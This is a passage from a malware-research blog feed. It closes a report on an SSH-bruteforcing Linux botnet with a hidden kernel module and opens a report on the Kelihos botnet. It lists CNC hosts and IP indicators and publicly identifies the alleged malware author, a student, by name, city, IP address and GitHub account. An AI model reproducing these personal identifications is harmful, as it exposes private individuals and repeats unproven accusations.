listed, and as long as the CNC target file is available to be downloaded by the compromised(infected) server.. This is why I called this as a \"nasty\" malware in its design.  \u003Cp\u003E\u003Ch2\u003EThe threat's source\u003C\/h2\u003E \u003Cp\u003EFor the mitigation purpose herewith the network correlation of the threat:  \u003Cp\u003E1. The \u003Ci\u003ECNC host\u003C\/i\u003E for \u003Ci\u003Edownload\u003C\/i\u003E and \u003Ci\u003Ecredential panel API\u003C\/i\u003E(in php)  is served under hostname of \u003Cb\u003E\u003Ci\u003E\"testzzzzzz.10g.me\"\u003C\/i\u003E\u003C\/b\u003E which is located in IP as per below. \u003Ci\u003E(PS: I think the coder loves to add some \"Z\" in several keywords..\u003C\/i\u003E: \u003Cpre class=\"brush: asm\"\u003E;; QUESTION SECTION:\u003Cbr \/\u003E;testzzzzzz.10g.me.             IN      A\u003Cbr \/\u003E\u003Cbr \/\u003E;; ANSWER SECTION:\u003Cbr \/\u003Etestzzzzzz.10g.me.      3600    IN      A       93.188.160.78\u003Cbr \/\u003E\u003Cbr \/\u003E;; AUTHORITY SECTION:\u003Cbr \/\u003E10g.me.                 3600    IN      NS      ns1.main-hosting.com.\u003Cbr \/\u003E10g.me.                 3600    IN      NS      ns2.main-hosting.com.\u003Cbr \/\u003E\u003Cbr \/\u003E;; ADDITIONAL SECTION:\u003Cbr \/\u003Ens1.main-hosting.com.   3600    IN      A       31.170.163.241\u003Cbr \/\u003Ens2.main-hosting.com.   3600    IN      A       31.220.23.1\u003Cbr \/\u003E\u003C\/pre\u003EIt was checked that the actor is utilizing the service of the \u003Cb\u003EChina domain hoster: 10g.me\u003C\/b\u003E to set this CNC host.  \u003Cp\u003E2. The first 3 IP addresses in \u003Cb\u003Esshv-service-rule\u003C\/b\u003E are \u003Ci\u003Esuspected \u003C\/i\u003Ebelong to the actor(s) themself. \u003Cpre class=\"brush: asm\"\u003E$ cat sshv-service-rule\u003Cbr \/\u003E#1\u003Cbr \/\u003E\"178.62.163.229\"\u003Cbr \/\u003E\"101.229.[65-70].128\"\u003Cbr \/\u003E\"178.62.163.[228-231]\"\u003Cbr \/\u003E10.10.10.*\u003Cbr \/\u003E10.[20-25].123.123\u003C\/pre\u003EWhich \u003Cb\u003E178.62.163.[228-231]\u003C\/b\u003E is apparently \u003Ci\u003Ea rental VPS\u003C\/i\u003E in \u003Cb\u003EDigital Ocean Hoster at Netherland\u003C\/b\u003E data center: \u003Cpre class=\"brush: asm\"\u003E{\u003Cbr \/\u003E  \"ip\": \"178.62.163.[228-231]\",\u003Cbr \/\u003E  \"hostname\": \"No Hostname\",\u003Cbr \/\u003E  \"city\": \"Amsterdam\",\u003Cbr \/\u003E  \"region\": \"North Holland\",\u003Cbr \/\u003E  \"country\": \"NL\",\u003Cbr \/\u003E  \"loc\": \"52.3740,4.8897\",\u003Cbr \/\u003E  \"org\": \"AS200130 Digital Ocean, Inc.\",\u003Cbr \/\u003E  \"postal\": \"1000\"\u003Cbr \/\u003E}\u003C\/pre\u003E3. There is another IP to be marked with, linked with the \u003Ci\u003Eactor information \u003C\/i\u003E directly and \u003Ci\u003Ehis purpose\u003C\/i\u003E in the following section.  \u003Cp\u003E\u003Ch2\u003EThe bad (kid) actor..\u003C\/h2\u003E \u003Cp\u003EObviously the actor, which is undoubtedly \u003Cb\u003Ethe coder of the kernel module of this malware\u003C\/b\u003E according to the previous written codes, which he is \u003Ci\u003Enot caring much off\u003C\/i\u003E his privacy too, \u003Cb\u003E\u003Ci\u003Ehis name\u003C\/i\u003E\u003C\/b\u003E is spotted in the \u003Ci\u003Emalware set of kernel module source code\u003C\/i\u003E. Maybe he can code a bit in C and does some Linux operations \u0026 code some scripts, but this guy is an \u003Ci\u003Eamateur\u003C\/i\u003E if he is a crook.. NEVERTHELESS, \u003Cb\u003Eundoubtedly\u003C\/b\u003E, \u003Cb\u003Ehe was making a VERY nasty new approach of a bad ELF malware botnet and implementing it in our internet!!\u003C\/b\u003E And for this, \u003Cb\u003Eit has to be stopped!\u003C\/b\u003E \u003Cp\u003EA further investigation on the \u003Cb\u003E\"ssh-service-rule\"\u003C\/b\u003E hosts is bumped to the identification of the \"actor\": \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-OFgpKbj1Czs\/VnsHMymygXI\/AAAAAAAAT9k\/spZ_4Ou6U94\/s5120\/JerryXU.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-OFgpKbj1Czs\/VnsHMymygXI\/AAAAAAAAT9k\/spZ_4Ou6U94\/s580\/JerryXU.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E \u003Cp\u003EIt doesn't take much time afterwards for our team to spot \u003Cb\u003Ethe actor's ID and his \"project\"\u003C\/b\u003E. To \u003Cb\u003EJerry Xu \u003C\/b\u003Ein Shanghai, China. \u003Cb\u003EWE ARE ALL STARRING AT YOU NOW!\u003C\/b\u003E \u003C!a href=\"http:\/\/imgur.com\/YucxqFU\"\u003E[removed]\u003C!\/a\u003E \u003C!a href=\"http:\/\/tieba.baidu.com\/p\/1865656488\"\u003E[removed]\u003C!\/a\u003E! STOP playing with SSH hacking botnet!!\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ibd7MAXryvw\/VnsQxojK_eI\/AAAAAAAAT90\/ciFxW0szxoM\/h5120\/012.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ibd7MAXryvw\/VnsQxojK_eI\/AAAAAAAAT90\/ciFxW0szxoM\/s580\/012.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E For further trace we found \u003Ci\u003EJerry Xu's \u003Ci\u003EGitHub\u003C\/i\u003E\u003C\/i\u003E, it is in here--\u003E\u003C!a href=\"https:\/\/github.com\/fei960922\"\u003E[removed]\u003C!\/a\u003E\u003Cbr\u003EAnd in that \u003Ci\u003EGithub \u003C\/i\u003Ehis \u003Cb\u003Emalware coding project \u003C\/b\u003E with name of \u003Cb\u003E\u003Ci\u003E\"Computer_System_Project\"\u003C\/i\u003E\u003C\/b\u003E for this malware is also spotted afterward after analysis report was posted:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-qfMnoQM9CHo\/VnsWFd_Td-I\/AAAAAAAAT-E\/Sa4g3tML7_8\/s5120\/013.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-qfMnoQM9CHo\/VnsWFd_Td-I\/AAAAAAAAT-E\/Sa4g3tML7_8\/s580\/013.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EThe \u003Cb\u003E\u003Ci\u003E\"malware \/ virus project's\"\u003C\/i\u003E\u003C\/b\u003E itinerary, deisgn and how to build it:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-abt2wY6SUZI\/Vnt9Onhp6AI\/AAAAAAAAT-0\/ZtXvDZaQLGY\/s5120\/015.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-abt2wY6SUZI\/Vnt9Onhp6AI\/AAAAAAAAT-0\/ZtXvDZaQLGY\/s180\/015.PNG\u003E\u003C\/a\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/--Ry9pmwakbM\/Vnt9OjLrZ8I\/AAAAAAAAT-4\/hIyZ2OQTTUE\/s5120\/016.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/--Ry9pmwakbM\/Vnt9OjLrZ8I\/AAAAAAAAT-4\/hIyZ2OQTTUE\/s180\/016.PNG\u003E\u003C\/a\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-jIdsvfM0J_w\/VnubAQHQgxI\/AAAAAAAAT_M\/5mFhVGVgywU\/s5120\/017.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-jIdsvfM0J_w\/VnubAQHQgxI\/AAAAAAAAT_M\/5mFhVGVgywU\/s180\/017.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EWe will leave it to you all to think about the \u003Ci\u003Emorality \u003C\/i\u003Eand \u003Ci\u003Eeducational aspect\u003C\/i\u003E in using such \u003Ci\u003Emalware\u003C\/i\u003E for the \u003Ci\u003E\"school project\"\u003C\/i\u003E, I have a deep doubt about the supervising scheme for this project too actually. But, one thing for sure is, when Michal and myself sees the binary of this \u003Ci\u003Ebot client\u003C\/i\u003E, \u003Cb\u003Ewe see it as a dangerous ELF malware\u003C\/b\u003E. A further check that we are doing is showing that the malware actor himself was uploading the \u003Ci\u003Emalware binary\u003C\/i\u003E to the \u003Ci\u003EVirusTotal\u003C\/i\u003E for the possible purpose to check its detection ratio..\u003Cbr\u003EWell, as a \u003Ci\u003E\"school project\"\u003C\/i\u003E they really are getting a bit out of hand here, isn't it?   \u003Cp\u003EThe below data is likely \u003Ci\u003EJerry's\u003C\/i\u003E related IP address located in \u003Ci\u003EShanghai\u003C\/i\u003E, as per spotted in his \u003Cb\u003Esshv-service-rule\u003C\/b\u003E, so if you see some malicious activity from it, this post can be used as reference of what had happened: \u003Cpre class=\"brush: asm\"\u003E{\u003Cbr \/\u003E  \"ip\": \"101.229.65.128\",\u003Cbr \/\u003E  \"hostname\": \"No Hostname\",\u003Cbr \/\u003E  \"city\": \"Shanghai\",\u003Cbr \/\u003E  \"region\": \"Shanghai Shi\",\u003Cbr \/\u003E  \"country\": \"CN\",\u003Cbr \/\u003E  \"loc\": \"31.0456,121.3997\",\u003Cbr \/\u003E  \"org\": \"AS4812 China Telecom (Group)\"\u003Cbr \/\u003E}\u003C\/pre\u003E \u003Cp\u003EIt looks like \u003Ci\u003EJerry \u0026 Co \u003C\/i\u003Eis \u003Cb\u003Etesting his malware \u003Ci\u003E\"online\"\u003C\/i\u003E\u003C\/b\u003E to some \u003Ci\u003Einternet servers\u003C\/i\u003E too. This is snipped result of data grabbed saved in the CNC \u003Cb\u003Econtaining success exploitation IP and password \u003C\/b\u003Eof SSH targeted servers. I would say it could be a test stage result.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-VhBa41Ku73M\/VnssIFnLf5I\/AAAAAAAAT-k\/mvAgVfm-p4U\/s4120\/014.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-VhBa41Ku73M\/VnssIFnLf5I\/AAAAAAAAT-k\/mvAgVfm-p4U\/s580\/014.PNG\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003EGuideline to conduct a responsible malware research\u003C\/h2\u003E \u003Cp\u003EWe are not against research for malicious codes, and \u003Cb\u003Eit is good\u003C\/b\u003E for doing such research for the further \u003Ci\u003Emitigation\u003C\/i\u003E and \u003Ci\u003Eprotection purpose\u003C\/i\u003E. However, \u003Cb\u003E\"malcodes\"\u003C\/b\u003E can do harm and can be re-use by cyber criminal for the bad purpose. Therefore, such research has to be properly\/securely setup to conduct tests for its legit purpose.   \u003Cp\u003EThere are \u003Ci\u003Ebasic guidelines\u003C\/i\u003E to be \u003Ci\u003Emust-followed\u003C\/i\u003E in order to securely setup and conduct such research with its tests. From our point of view, the basic \u003Cb\u003Eguidelines\u003C\/b\u003E to follow is as per below points: \u003Ci\u003E\u003Cpre\u003E- Always put some notes in binary\/environment stated the purpose of research\/test\u003Cbr \/\u003E- Never conduct the test in the open internet connectivity\u003Cbr \/\u003E- Do not EVER use internet nodes as a test bed!! Unless you have written consent for it.\u003Cbr \/\u003E- Highly supervised by the responsible legit entity and\/or institution\u003Cbr \/\u003E- Do not share the malcodes openly and leave it up-and-alive openly accessible in internet\u003Cbr \/\u003E  ( do the limited access for the research purpose )\u003C\/pre\u003E\u003Ci\u003E\u003C\/i\u003E\u003C\/i\u003E \u003Cp\u003E\u003Ch2\u003EEpilogue and follow up\u003C\/h2\u003E \u003Cp\u003EI thank Michal for this \u003Ci\u003Egood finding\u003C\/i\u003E. And for \u003Ci\u003E\u003Cb\u003EMalwareMustDie ELF team mates\u003C\/b\u003E\u003C\/i\u003E who swiftly cracked the source of the threat, ID and the real situation of this case, you are all awesome! Thank you to all friends who help to follow the case until the very end of it. \u003Cp\u003ELet's not make our internet dirty by be more responsible in conducting research on dangerous material like computer virus or malware. Please remember that in some countries even if you own the source code of the malware you'll have a serious trouble with the law and authority.\u003Cp\u003EFor the research purpose, you can fetch the sample safely in our-beloved \u003Cb\u003EELF malware repository in \u003Ci\u003Ekernelmode.info\u003C\/i\u003E\u003C\/b\u003E [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=4153\"\u003Elink\u003C\/a\u003E], you'll see my experts colleagues in ELF malware research are on discussion on this threat, you can join this malware related discussion in there.  \u003Cp\u003EFor the \u003Cb\u003E\u003Ci\u003Emitigation\u003C\/i\u003E\u003C\/b\u003E, \u003Cb\u003E\u003Ci\u003ELinux hardening\u003C\/i\u003E\u003C\/b\u003E and \u003Cb\u003E\u003Ci\u003Esysadmin perspective\u003C\/i\u003E\u003C\/b\u003E of this type of malware threat, there is a nice \u003Ci\u003Ediscussion \u003C\/i\u003Ethat I am assisting on \u003Ci\u003Ereddit's\u003C\/i\u003E \u003Cb\u003E\u003Ci\u003E\/r\/linux\u003C\/i\u003E\u003C\/b\u003E [\u003Ca href=\"https:\/\/www.reddit.com\/r\/linux\/comments\/3y2n4o\/malware_must_die_mmd00472015_sshv_ssh_bruter_elf\/\"\u003Elink\u003C\/a\u003E], on the other \u003Ci\u003Ereddit\u003C\/i\u003E's \u003Cb\u003E\u003Ci\u003E\/r\/Malware\u003C\/i\u003E\u003C\/b\u003E thread I am posting \u003Cb\u003E\u003Ci\u003Efollow up info \u003C\/i\u003E\u003C\/b\u003Eof the case [\u003Ca href=\"https:\/\/www.reddit.com\/r\/Malware\/comments\/3y0mbb\/this_is_how_a_kid_in_china_made_malware_elf_ssh\/\"\u003Elink\u003C\/a\u003E].  \u003Cp\u003E\u003Ch2\u003EThe apology from coder \u0026 a requirement of the virus making project..\u003C\/h2\u003E \u003Cp\u003EAfter following some requests, we saw the infrastructure for this malware was taken down:\u003Cbr\u003E\u003Cp\u003E\u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E After 24h post \u0026amp; requests sent to GitHub \u0026amp; Univ, CNC+GitHub \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E code was taken down, THANK YOU! \u003Ca href=\"https:\/\/t.co\/fQJzFVIeHv\"\u003Epic.twitter.com\/fQJzFVIeHv\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/680473442630565888\"\u003EDecember 25, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EWe then received a sincere apology message from the \u003Ci\u003Emalware coder\u003C\/i\u003E. He admitted to test it online too. You can see his message posted in his blog by online in here [\u003Ca href=\"http:\/\/fei22.cn\/project\/Apology%20about%20my%20malware!.html\"\u003Elink\u003C\/a\u003E]. It's in English so you can read and comprehend the message as well as I do.   \u003Cp\u003EI, on behalf of my team, thanked Jerry for the sincere apology, and will delete the privacy related link and material I posted to this post \u003Cb\u003Eafter we confirm\u003C\/b\u003E some facts further. The point in the message that I think you all need to know too is, as per shown in the below picture. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-gisufKJdloo\/Vn4ww178__I\/AAAAAAAAT_8\/gkctSNcLdC8\/s5591\/%25E3%2582%25AD%25E3%2583%25A3%25E3%2583%2597%25E3%2583%2581%25E3%2583%25A3.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-gisufKJdloo\/Vn4ww178__I\/AAAAAAAAT_8\/gkctSNcLdC8\/s580\/%25E3%2582%25AD%25E3%2583%25A3%25E3%2583%2597%25E3%2583%2581%25E3%2583%25A3.PNG\u003E \u003C\/a\u003E\u003Cbr\u003EWe need to be cleared of one thing only, is it a \u003Ci\u003Erequirement\u003C\/i\u003E \u003Ci\u003Efrom himself\u003C\/i\u003E as the virus project leader or \u003Ci\u003Efrom the university side\u003C\/i\u003E to make this \u003Cb\u003Evirus project\u003C\/b\u003E with its requirement?   \u003Cp\u003EI think Jerry personally knows the bad effect of his \"project\" and he gently admits his mistake showing he now awares of the dangerous effect for openly deploying his virus project and his tests. He made a good decision to put down all codes offline the GitHub, I respect that.  After all, we thank Jerry for raising a very important aspect in Linux security too. It is a Christmas session now, let's accept the apology (upon confirming some facts) and \u003Cb\u003E\u003Ci\u003EMerry Christmas to Jerry from MalwareMustDie\u003C\/i\u003E\u003C\/b\u003E.  \u003Cp\u003E#MalwareMustDie!"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/1945929060245912978\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/12\/mmd-0047-2015-sshv-ssh-bruter-elf.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/1945929060245912978"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/1945929060245912978"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/12\/mmd-0047-2015-sshv-ssh-bruter-elf.html","title":"MMD-0047-2015 - SSHV: SSH bruter ELF botnet malware w\/hidden process kernel module"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-qWgXOqfX7PM\/VnrGBDSv3ZI\/AAAAAAAAT7g\/iOnEP1mmnfI\/s72-c\/001.PNG","height":"72","width":"72"},"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-2960441158452306538"},"published":{"$t":"2015-12-21T04:53:00.000-08:00"},"updated":{"$t":"2016-08-28T20:42:26.372-07:00"},"title":{"type":"text","$t":"MMD-0046-2015 - Cyber crime: Kelihos 10 nodes CNC on NJIIX, New Jersey USA, with a known russian crook who rented them"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EGlobal variable declaration to read correctly\u003C\/h2\u003E \u003Cp\u003E\u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E#include \u003Cstdio.h\u003E\u003Cbr \/\u003E\u003Cbr \/\u003Eint main(void) {\u003Cbr \/\u003E char * email = \"XXXXX\\(censored\\)\\ data\";\u003Cbr \/\u003E                }\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E\u003Ch2\u003EBackground\u003C\/h2\u003E \u003Cp\u003E\u003Cb\u003E\u003Ci\u003E\u003Cfont color=yellow\u003ENote2: Considering: The attack of Kelihos botnet to my country and several countries is still un-stoppable and on-going, Yet I was told to censored Kelihos investgation on 2013 without getting good follow up from law enforcement in this planet, no matter how hard we tried and providing evidences in each badness they made. And this post, also was asked to be on censor AGAIN, and right now we also did not see the stopping result either. Concluded: It is time for the people as victims of this evilness to know the truth. I opened all censorship from its seal[\u003Ca href=\"http:\/\/goo.gl\/oK0gPz\"\u003Elink\u003C\/a\u003E]. \u003Cp\u003ETHIS is the one of many badness evidence conducted by Kelihos botherder: Peter Severa with his real ID and address we reported and is known by law enforcement (PS: it is NOT the ID that Brian Krebs announced). Use it by your own will. If the action of this borherder will continue, we will keep on disclosing further and further. God gave us strength to put right thing to the right place - @unixfreaxjp - Sat Feb  6 12:58:38 JST 2016\u003C\/i\u003E\u003C\/b\u003E\u003C\/font\u003E \u003Cblockquote class=\"twitter-tweet\" data-lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003ESeriously, seeing how people still suffer by \u003Ca href=\"https:\/\/twitter.com\/hashtag\/Kelihos?src=hash\"\u003E#Kelihos\u003C\/a\u003E, while all of disclosures we made is on censor, made me feel betrayed for saying truth\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/695803931381731329\"\u003EFebruary 6, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003E\u003Cb\u003E\u003Ci\u003E\u003Cfont color=green\u003ENote: This is the modified post of the original post, sensitive data were censored for the \"security reason\". Please read \"between the lines\". I am sorry and thank you.  - God bless them who read the codes - @unixfreaxjp Tue Dec 22 16:56:01 JST 2015\u003C\/font\u003E\u003C\/i\u003E\u003C\/b\u003E \u003Cp\u003EMost of fellow malware and botnet researchers in security communities know the term of \u003Ci\u003E\"kelihos botnet\"\u003C\/i\u003E. Many of us find it interesting to be studied. The botnet exists for a long time until now, and surviving many \u003Ci\u003Etake down\u003C\/i\u003E and \u003Ci\u003Edisruption\u003C\/i\u003E efforts, yet it is still in operation until now [\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-AkNSoNnLBtc\/VngC6EzvGOI\/AAAAAAAAT6I\/smapw0BnlLE\/s5120\/012.png\"\u003Elink\u003C\/a\u003E].  \u003Cp\u003EMalwareMustDie group has a \u003Cb\u003E\"Kelihos Operation\"\u003C\/b\u003E in a small dedicated unit to research this threat and we tried to be responsible in disclosing the botnet malicious distribution scheme and its payloads in 2013, and we presented the talk about it at the BotConf in 2013 [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2013\/12\/short-talk-in-botconf-2013-kelihos.html\"\u003Elink\u003C\/a\u003E]. The team was following the threat ever since by tireless efforts to report and try to support regional jurisdiction to stop the botnet's further malicious activity. And believe me, MalwareMustDie is aiming a way \u003Cb\u003Efurther \u003C\/b\u003Ethan just a \u003Cb\u003E\u003Ci\u003Ewhack-a-mole\u003C\/i\u003E\u003C\/b\u003E actions that some industries and researchers think we were, the disclosure that we had on the case, and this post is a proof of our hard work for it.  \u003Cp\u003EEven physical action(s) was conducted by law (with hat tips of the great work of \u003Ci\u003EGroupIB\u003C\/i\u003E friends [\u003Ca href=\"http:\/\/www.group-ib.com\/\"\u003Elink\u003C\/a\u003E]) for the effort to end this \"legacy\" for good, the herder who is a notorious cyber criminal [\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-YDJ02r_zugE\/VnfDFNjAL6I\/AAAAAAAAT3o\/-UZv7nPGa6c\/s4444\/1003.png\"\u003Elink\u003C\/a\u003E][\u003Ca href=\"http:\/\/krebsonsecurity.com\/tag\/peter-severa\/\"\u003Elink\u003C\/a\u003E][\u003Ca href=\"http:\/\/www.spamhaus.org\/rokso\/spammer\/SPM893\/peter-severa-peter-levashov\"\u003Elink\u003C\/a\u003E] knows how to bent the law, and is back on operation, with some improvement in the botnet itself.  \u003Cp\u003EIn the Q3 and Q4 in this year there are strong distribution [\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-FCog5M04WRk\/VnfBDeQZ4kI\/AAAAAAAAT3c\/cz-effF6sZk\/s3120\/4008.png\"\u003Elink\u003C\/a\u003E] of Kelihos binaries from several \"major\" \u003Cb\u003E\u003Ci\u003EExploit Kits\u003C\/i\u003E\u003C\/b\u003E [\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-4xRi3-hydi0\/VnfAtlOdLMI\/AAAAAAAAT3U\/4S4ucaslPYo\/s3336\/4005.PNG\"\u003Elink\u003C\/a\u003E], implying the effort of the herder to expand the botnet. And following that time frame several botnet \u003Ci\u003Emalicious campaigns\u003C\/i\u003E were also started to be detected under a very short infection uptime and was carefully planned in aiming specific regional target on a specific operating system platform. Afterward, just recently. there are events of \u003Ci\u003E\"disruption activities\"\u003C\/i\u003E was occurred in the botnet, which has boosted the botnet's access revocation, technical changes, updates on versions  and security improvements to be better than before (i.e.in: domains, encryption, payloads, name servers \u0026 http services etc) without really reducing its \u003Cb\u003E\u003Ci\u003EP2P peers activity \u003C\/i\u003E\u003C\/b\u003Esignificantly, hence the botnet is still on operation but not as \"greedy\" like we've seen it before in 2012 and 2013.   \u003Cp\u003EThe recent development is urging me on behalf of operation unit in our Kelihos team, to disclose as \"\u003Ci\u003Eresponsible\u003C\/i\u003E\" as possible several new updates in information that \u003Ci\u003Emaybe can be used \u003C\/i\u003Eand linked by \u003Ci\u003Elaw enforcement\u003C\/i\u003E effort to build a new cyber criminal case for this well known \u003Ci\u003Ebot herder\u003C\/i\u003E.  \u003Cp\u003EWe thanked gentlemen\/ladies for the hard work they shared together in effort to stop the threat (this credit list is not only MMD members but contributors are included) \u003Ci\u003E\u003Cpre\u003E@VriesHd @Malwageddon @Set_Abominae @DhiaLite @malm0u53 @Xylit0l@ConradLongmore @keyleyang001 @s4n7h0 @essachin \u003Cbr \/\u003E@sempersecurus @JC_SoCal @ChristiaanBeek @unixfreaxjp @lvdeijk @wirehack7 @wopot @kafeine\u003C\/pre\u003E\u003C\/i\u003EThese are the people who stick together still and contribute very hard effort of the case with the separate specialties. I myself is in charge for the CNC \u0026 infrastructure investigation for the threat, and this writing is mostly based on that specific territory, so I tried to write it without revealing much OpSec of my other team mats in various section. So, the post will not reveal all details of operational aspect, since there are many more \u003Ci\u003E\"bigger deal\"\u003C\/i\u003E that has to be kept close for the further investigation. You can feel free to contact us via twitter DM if somehow I may can assist you more on the issue.  \u003Cp\u003E\u003Ch2\u003EKelihos FUD (Fully UnDetected) check scheme\u003C\/h2\u003E \u003Cp\u003EGenerally speaking: As this botnet concept is \u003Ci\u003Epeer to peer\u003C\/i\u003E, it uses encrypted communication \u003Ci\u003Eone-to-one basis\u003C\/i\u003E that redundantly connected to the targeted\/instructed peers specified from the central command. The \u003Ci\u003Ecentral\u003C\/i\u003E pushes \u003Ci\u003Ecommands \u003C\/i\u003Eto the \u003Ci\u003Einfected peers\u003C\/i\u003E by working in rings of encryption layers, which is varied in encryption to each level, and the peers in each group can reply a \u003Ci\u003E\u003Cb\u003Epong\u003C\/b\u003E\u003C\/i\u003E in generic protocol in \"a state\" that can be notified by the highest central. This is a way of the botnet can be \"steered\" to aim specific territory like this example [\u003Ca href=\"http:\/\/blog.0day.jp\/2015\/10\/ocjp-128-11.html\"\u003Elink\u003C\/a\u003E] and to launch a \u003Ci\u003Especific spam\u003C\/i\u003E and\/or \u003Ci\u003Etraffic redirection\u003C\/i\u003E campaigns (the example is in the next paragraph), \u003Cb\u003Eor\u003C\/b\u003E to avoid several networks, \u003Cb\u003Eor\u003C\/b\u003E \"activated \/ deactivated\" activities on some region. \u003Ci\u003EIn this paragraph I am in purpose omitting various function details that the botnet has (dns\/http\/blacklist\/p2p crypt\/spam modules\/etc etc).\u003C\/i\u003E \u003Cp\u003EAs \u003Cb\u003E\u003Ci\u003Epeering-functionality\u003C\/i\u003E\u003C\/b\u003E is important to the \u003Ci\u003Ekelihos botnet\u003C\/i\u003E. \u003Ci\u003Ethe herder\u003C\/i\u003E is using a \u003Cb\u003Eknown FUD checking service\u003C\/b\u003E to make sure the main botnet nodes is free from detection, with checking security industry's mitigation\/protection signatures [\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-lCXWyXCz6S0\/VnkjOPheR6I\/AAAAAAAAT7Q\/HHE1xPH92BU\/s5120\/016.PNG\"\u003Elink\u003C\/a\u003E], by rapidly monitoring detection ratio of the: \u003Cb\u003E(1)\u003C\/b\u003E \u003Ci\u003EBinary payloads\u003C\/i\u003E, \u003Cb\u003E(2)\u003C\/b\u003E \u003Ci\u003EIP addresses\u003C\/i\u003E of Kelihos job server's and main communication peers, \u003Cb\u003E(3)\u003C\/b\u003E \u003Ci\u003Eand CNC hosts\u003C\/i\u003E, \u003Cb\u003E(4)\u003C\/b\u003E \u003Ci\u003Ethe web html pages\u003C\/i\u003E contains \u003Ci\u003Ejavascript\u003C\/i\u003E, installed in peers that is distributed for supporting several malicious operations (i.e.: click fraud, redirectors, malware infection, spam sites, etc). \u003Ci\u003EThe herder\u003C\/i\u003E never keeps the detection ratio high and only picking several important nodes in the botnet to have the lowest detection ratio as possible, and also trying very hard to keep the \u003Ci\u003Ejob servers\u003C\/i\u003E and \u003Ci\u003ECNC \u003C\/i\u003E of Kelihos to have detection score to be close to zero.  \u003Cp\u003EKelihos is a \u003Cb\u003E\u003Ci\u003Ebotnet as service\u003C\/i\u003E\u003C\/b\u003E which is having \u003Ci\u003Eits own function\u003C\/i\u003E to spread its threat activity, mainly by spam email from its original spam module, which are controlled directly by the herder to aim to specific region(s) or by redirection scheme. Several scheme of recent distribution spotted in this functionality is as per following illustrations: [\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-8ewGlsirgGA\/VnfIQNiyyiI\/AAAAAAAAT4E\/jjC5i3nJEd8\/s3333\/kelispam05.png\"\u003Epump-and-dump\u003C\/a\u003E] [\u003Ca href=\"https:\/\/pastebin.com\/QnupW4Wp\"\u003Emalicious JS redirector\u003C\/a\u003E] [\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Ug2HAK1UarA\/VnfIPmJGVTI\/AAAAAAAAT38\/sjVwjlzQ7QA\/s4120\/kelispam03.png\"\u003EURL link basis\u003C\/a\u003E] 